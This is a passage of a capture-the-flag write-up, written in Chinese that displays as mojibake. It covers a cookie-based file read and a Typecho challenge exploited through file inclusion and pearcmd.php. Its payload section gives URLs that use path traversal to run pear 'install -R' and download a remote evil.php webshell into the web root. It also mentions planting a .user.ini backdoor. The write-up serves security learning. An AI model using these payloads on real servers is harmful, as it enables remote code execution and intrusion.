![image-20211023230842820](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230842820.png)

å°†APIæ”¹ä¸º../flag.php `Li4vZmxhZy5waHA%3d`

![image-20211023230912588](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230912588.png)

â€”â€”â€”â€”å…¶å®å¦‚æœå…ˆæ‰«ç›®å½•æ‰«åˆ°/old/feature.phpçš„è¯ï¼Œå¯ä»¥å°†APIè®¾ä¸º./feature.php `Li9mZWF0dXJlLnBocA%3d%3d` è¯»åˆ°è¿™ä¸€æ®µ

![image-20211023231112340](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023231112340.png)

åç«¯çš„é€»è¾‘å°±æ˜¯å°†cookie['api']å–å‡ºï¼Œç›´æ¥è¯»å‡ºå†…å®¹

æœ‰ä¸€ç‚¹ç‚¹è„‘æ´ï¼Œä¹Ÿè·Ÿçœ¼åŠ›è§æœ‰å…³ç³»ï¼Œæˆ‘ä¸€å¼€å§‹æ˜¯çœŸæ²¡æ³¨æ„åˆ°è¿™ä¸ªcookieçš„APIå­—æ®µï¼Œå±å®æ˜¯æœ‰ç‚¹å¤§ç—…ï¼›ä¹‹ååšé¢˜è¿˜æ˜¯è¦å¼€ç¯å¢ƒä¹‹åå°±è¿burpï¼Œæ³¨æ„è§‚å¯Ÿå“åº”å¤´çš„ç‰¹æ®Šå­—æ®µ cookieçš„ç±»å‹/ctrl+uçš„æºç /å¯èƒ½ä¼šæœ‰çš„æ§åˆ¶å°çš„æç¤ºä¿¡æ¯/robots.txtè¿™äº›ä¸œè¥¿ï¼Œä¸è¦é—æ¼ï¼Œä¸ç„¶å°±å¾ˆå¯æƒœäº†

## Give_me_you_0day

![image-20211023131341209](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023131341209.png)

è¿™é‡Œè€ƒå¯Ÿçš„ç‚¹å¹¶ä¸æ˜¯Typecho 1.1/17.10.30ç‰ˆæœ¬çš„0dayï¼ˆç»™å‡ºçš„æºç å°±å®Œå…¨æ˜¯githubä¸Šçš„å‘è¡Œç‰ˆï¼‰ï¼Œè€Œæ˜¯install.phpä¸­ 608è¡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«

![image-20211023233205364](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023233205364.png)

åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥æï¼Œpayloadå¯ä»¥ç›´æ¥å‚è€ƒ[[RCTF 2021] VerySafe](https://blog.rois.io/2021/rctf-2021-official-writeup-2/)

![image-20211024030247104](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030247104.png)

![image-20211024025903697](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024025903697.png)

![image-20211024030018830](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030018830.png)

æ‰“çš„ç‚¹åœ¨äºpeclcmdï¼Œè¿™é‡Œæ¶‰åŠåˆ°çš„é¢˜å’ŒçŸ¥è¯†å®³æŒºå¤šï¼Œä¹‹å‰çœŸæ²¡è§è¿‡ï¼ˆdbqæ˜¯æˆ‘åšçš„é¢˜å¤ªå°‘å¤ªå°‘äº†ï¼‰ï¼Œåœ¨è¿™é‡Œä¸€å¹¶å­¦ä¹ äº†

### å…³äº`register_argc_argv`é…ç½®é¡¹

æ˜¯php.iniæ ¸å¿ƒé…ç½®ä¸­çš„ä¸€ä¸ªé€‰é¡¹ï¼Œé»˜è®¤æ˜¯è¿™æ ·![image-20211024002824679](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024002824679.png)

[æ‰‹å†Œ](https://www.php.net/manual/zh/ini.core.php#ini.register-argc-argv)æ˜¯è¿™æ ·å†™çš„

![image-20211024000219559](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000219559.png)

![image-20211024000145606](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000145606.png)

![image-20211024000543235](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000543235.png)

ä»php=4.0.0åä¸ºå¯è®¾ç½®çš„é€‰é¡¹ï¼ˆæ­¤å‰æ€»ä¸ºOnï¼‰é»˜è®¤ä¸ºå¼€å¯çŠ¶æ€ï¼Œå½“php<=4.2.3æ—¶å¯ä¿®æ”¹èŒƒå›´æ˜¯`PHP_INI_ALL`ï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥å‚è§->[PHPçš„å‘½ä»¤è¡Œæ¨¡å¼](http://ms7.fhsh.tp.edu.tw/php5c/features.commandline.html)

åœ¨`register_argc_argv`å¼€å¯çš„æƒ…å†µä¸‹ï¼Œcgiå’Œcliæ¨¡å¼ä¸‹éƒ½å¯ä»¥ç›´æ¥è®¿é—®åˆ°ä¼ å…¥çš„å‚æ•°ï¼›å…¶ä¸­argcæ˜¯ä¼ é€’è¿‡å»çš„å‚æ•°çš„ä¸ªæ•°ï¼Œargvæ˜¯åŒ…å«æœ‰å®é™…å‚æ•°çš„æ•°ç»„ï¼›cliæ¨¡å¼æµ‹è¯•å¦‚ä¸‹

```php
<?php
var_dump($_SERVER['argv']);
// var_dump($HTTP_SERVER_VARS['argv']);
var_dump($argv);
```

![image-20211024003201497](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003201497.png)

cgiçš„è¯ï¼Œç›´æ¥ç”¨ä¸Šé¢çš„`$_SERVER['argv']`æ˜¯ä¸ä¼šè·å–åˆ°å€¼

![image-20211024003801051](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003801051.png)

ç›´æ¥æŸ¥çœ‹$\_SERVERè¿™ä¸ªå¤§æ•°ç»„ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬çš„å‚æ•°åœ¨è¿™é‡Œæ˜¯ä»¥ä¸€æ•´ä¸ªQUERY\_STRINGçš„å½¢å¼å‡ºç°çš„ï¼ˆè¯¦ç»†çš„æ•°ç»„è§£æ->[PHPè¶…å…¨å±€å˜é‡$\_SERVERçš„ç”¨æ³•](https://www.feiniaomy.com/post/274.html)ï¼‰

![image-20211024012150841](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024012150841.png)

æœ‰ä¸ªç‰¹æ®Šçš„trickåœ¨äºï¼Œå¦‚æœæ˜¯

```
/test.php?a=1&b=1
```

ç¡®å®æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä½†è¿”å›çš„$_SERVER['argv']ä¸º1ï¼Œå¦‚æœæ˜¯

```
/test.php?a=1+b=1
```

åˆ™ä¼šè¢«æˆªæ–­ï¼Œè¿”å›$_SERVER['argv']åˆ™ä¸º2ï¼ˆè¯´å®è¯æˆ‘æœ¬åœ°çœŸæ²¡è·‘å‡ºæ¥è¿™ä¸ª å¯èƒ½æ˜¯å“ªé‡Œçš„é…ç½®æœ‰é—®é¢˜ï¼Ÿä½†æ˜¯çœ‹äº†å¾ˆå¤šèµ„æ–™ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯ä»¥è¢«å¤ç°æˆåŠŸçš„â€¦â€¦â€¦â€¦â€¦â€¦emmmm æœ‰ä¸€ç‚¹ç‚¹ç¦»è°±ï¼‰

![image-20211024020719209](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020719209.png)

### å…³äº`pear`å‘½ä»¤

pearæ˜¯*the PHP Extention and Application Repository*çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªPHPæ‰©å±•ä¸åº”ç”¨çš„ä»£ç ä»“åº“ï¼Œpearä»“åº“ä»£ç ä»¥åŒ…*package*åˆ†åŒºï¼Œæ¯ä¸€ä¸ª*pear package*éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®ï¼Œæœ‰è‡ªå·±ç‹¬ç«‹çš„å¼€å‘å›¢é˜Ÿã€ç‰ˆæœ¬æ§åˆ¶ã€æ–‡æ¡£å’Œå…¶ä»–åŒ…çš„ä¾èµ–å…³ç³»ä¿¡æ¯ï¼›*pear package*ä»¥phar, tar, zipå½¢å¼å‘å¸ƒï¼Œé€šè¿‡`apt install php-pear`æ¥å®‰è£…

pearå‘½ä»¤çš„å®ç°æ˜¯ä¸€ä¸ªshè„šæœ¬

```sh
#!/bin/sh

# first find which PHP binary to use
if test "x$PHP_PEAR_PHP_BIN" != "x"; then
	PHP="$PHP_PEAR_PHP_BIN"
else
	if test "/usr/local/bin/php" = '@'php_bin'@'; then
		PHP=php
	else
		PHP="/usr/local/bin/php"
	fi
fi

# then look for the right pear include dir
if test "x$PHP_PEAR_INSTALL_DIR" != "x"; then
	INCDIR=$PHP_PEAR_INSTALL_DIR
	INCARG="-d include_path=$PHP_PEAR_INSTALL_DIR"
else
	if test "/usr/local/lib/php" = '@'php_dir'@'; then
		INCDIR=`dirname $0`
		INCARG=""
	else
		INCDIR="/usr/local/lib/php"
		INCARG="-d include_path=/usr/local/lib/php"
	fi
fi

exec $PHP -C -q $INCARG -d data.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir="" -d safe_mode=0 -d register_argc_argv="On" -d auto_prepend_file="" -d auto_append_file="" $INCDIR/pearcmd.php "$@"
```

ä»æœ€åä¸€è¡Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†/pearcmd.phpï¼Œè€Œè¿™ä¸ªpearcmd.phpçš„å‚æ•°$argvå°±æ¥æºäº$_SERVER['argv']ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬å¯æ§çš„ä¼ å…¥å‚æ•°

### åˆ©ç”¨`pear`å‘½ä»¤æ‰§è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½

å¦‚å›¾ï¼Œç›´æ¥ä¸‹è½½å¼€å¯äº†httpæœåŠ¡å™¨çš„ç›®å½•ä¸‹çš„æŒ‡å®šæ–‡ä»¶åˆ°å½“å‰æ‰€åœ¨ç›®å½•

![image-20211024020030648](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020030648.png)

ä½¿ç”¨`install -R`è€Œé`download`å¯ä»¥æ§åˆ¶ä¸‹è½½åˆ°ä»»æ„ç›®å½•ï¼Œæ¯”å¦‚ç›´æ¥ä¸‹è½½åˆ°webæœåŠ¡çš„ç›®å½•

![image-20211024020411477](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020411477.png)

### æ‰€ä»¥æ€»ä½“æ€è·¯+payload

å¦‚æœå­˜åœ¨è¿™æ ·çš„ç¯å¢ƒ

- å®‰è£…pear
- å¼€å¯register_argc_argv
- å­˜åœ¨å¯æ§çš„ä¼ å…¥å‚æ•°æ¥åšåˆ°æ–‡ä»¶åŒ…å«ï¼ˆæ¯”å¦‚`include $_GET['f'].php`ï¼‰
- å¯ä»¥å‡ºç½‘

æˆ‘ä»¬å°±å¯ä»¥åšåˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½ä»è€Œgetshellï¼›å‰é¢ä¹Ÿæåˆ°register_argc_argvç»§ç»­PHP_IN_PREDIRï¼Œæˆ‘ä»¬å¯ä»¥ç•™ä¸€ä¸ª.user.iniçš„åé—¨æ¥è®¾ç½®register_argc_agrvä¸ºOn

**payload**å°±æ˜¯è¿™æ ·äº†

```
// å­˜åœ¨ include $_GET['f'].php
// webç›®å½•å¯å†™
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php
- http://ip:port/tmp/pear/download/evil.php
// tmpç›®å½•å¯å†™
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&+install+-R+/tmp+http://ip:port/evil.php
- http://ip:port/include.php?f=/tmp/pear/download/evil
```

é¦–å…ˆè¦åŒ…å«ä¸€ä¸ªæ­£ç¡®ä½ç½®çš„pearcmd.phpï¼ˆé€šå¸¸åœ¨/usr/local/lib/php/pearcmd.phpï¼‰ï¼Œæ¥ç€åŒ…å«&+download+http://your_vps/eval.phpï¼ˆæˆ–è€…å¦‚æœå‰é¢ç›´æ¥æ˜¯/pearcmd.phpçš„è¯å°±å¯ä»¥ç›´æ¥ç»™å‚æ•°äº†/pearcmd.php+download+http://your_vps/eval.phpï¼‰æ¥è£…ğŸï¼ˆæ³¨æ„è·¯å¾„æ˜¯å¦æ­£ç¡®ï¼‰ï¼Œä¹‹åå†åŒ…å«æˆ‘ä»¬çš„ğŸå³å¯

### å…¶å®ƒçš„ä¾‹é¢˜

[[CampCTF 2015] Trolol](https://web.archive.org/web/20201022203937/https://khack40.info/camp-ctf-2015-trolol-web-write-up/)

[[å·…å³°æå®¢ 2020] MeowWord](https://www.lemonprefect.cn/zh-tw/posts/9b2fbf24#MeowWorld)

[[RCTF 2021] VerySafe](https://blog.rois.io/2021/rctf-2021-official-writeup-2/)

------

è¿˜æ˜¯åšçš„é¢˜ä¸å¤Ÿå¤šï¼Œå·²æœ‰çš„çŸ¥è¯†ä¹Ÿåº”ç”¨çš„ä¸å¤Ÿç†Ÿç»ƒï¼Œå®åœ¨æ˜¯å¤ªå¤ªå¤ªå¤ªå¤ªèœäº†ï¼Œå¾—å¥½å¥½å­¦ï¼Œä¸èƒ½å¤©å¤©åˆ’æ°´æ‘¸é±¼
